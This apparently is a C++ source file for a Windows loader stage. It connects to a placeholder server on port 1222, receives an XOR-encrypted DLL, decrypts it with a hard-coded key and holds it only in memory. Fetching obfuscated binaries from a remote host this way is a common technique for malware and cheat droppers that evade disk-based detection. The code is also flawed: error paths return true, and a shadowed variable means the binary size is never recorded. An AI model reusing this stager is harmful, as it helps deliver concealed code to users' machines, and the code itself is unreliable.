#include <iostream>
#include <Winsock2.h>
#include <Windows.h>
#include <WS2tcpip.h>
#include <fstream>
#pragma comment(lib, "ws2_32.lib")
#include "Stream.h"
#define _WINSOCK_DEPRECATED_NO_WARNINGS

const uint8_t* Streaming::binary_mem = nullptr;
const size_t binary_size = 0;
const size_t bufferSize = 1906000; //Change to size of DLL
const BYTE key[] = { 0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0 }; //Must be same as server bud

void _fastcall decryptData(BYTE* data, size_t dataSize, const BYTE* key, size_t keySize)
{
    for (size_t i = 0; i < dataSize; i++)
    {
        data[i] = data[i] ^ key[i % keySize];
    }
}

bool _fastcall Streaming::stream_dll()
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cerr << "Failed to initialize Winsock." << std::endl;
        return 1;
    }

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET)
    {
        std::cerr << "Failed to create socket." << std::endl;
        WSACleanup();
        return 1;
    }

    SOCKADDR_IN serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(1222);

    if (inet_pton(AF_INET, "serveriphere", &(serverAddr.sin_addr)) <= 0)
    {
        std::cerr << "Failed to convert the server IP address." << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }
    if (connect(clientSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) != 0)
    {
        std::cerr << "Failed to connect to the server." << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }

    
    BYTE* encryptedData = new BYTE[bufferSize];
    int bytesReceived = 0;
    while (true)
    {
        int result = recv(clientSocket, reinterpret_cast<char*>(encryptedData + bytesReceived),
            bufferSize - bytesReceived, 0);
        if (result == SOCKET_ERROR)
        {
            std::cerr << "Failed to receive data." << std::endl;
            closesocket(clientSocket);
            WSACleanup();
            delete[] encryptedData; 
            return FALSE;
        }

        bytesReceived += result;
        if (bytesReceived >= bufferSize)
        {
            std::cerr << "Received data exceeded buffer size." << std::endl;
            closesocket(clientSocket);
            WSACleanup();
            delete[] encryptedData; 
            return FALSE;
        }

        if (result == 0)
        {
            break;
        }
    }

    closesocket(clientSocket);
    WSACleanup();

    
    const size_t keySize = sizeof(key);

    
    decryptData(encryptedData, bytesReceived, key, keySize);
   
    Streaming::binary_mem = new BYTE[bytesReceived];
    std::memcpy(const_cast<BYTE*>(Streaming::binary_mem), encryptedData, bytesReceived);
    const size_t binary_size = bytesReceived;

    const uint8_t* binary_mem = Streaming::binary_mem;
    delete[] encryptedData;

    return TRUE;
}
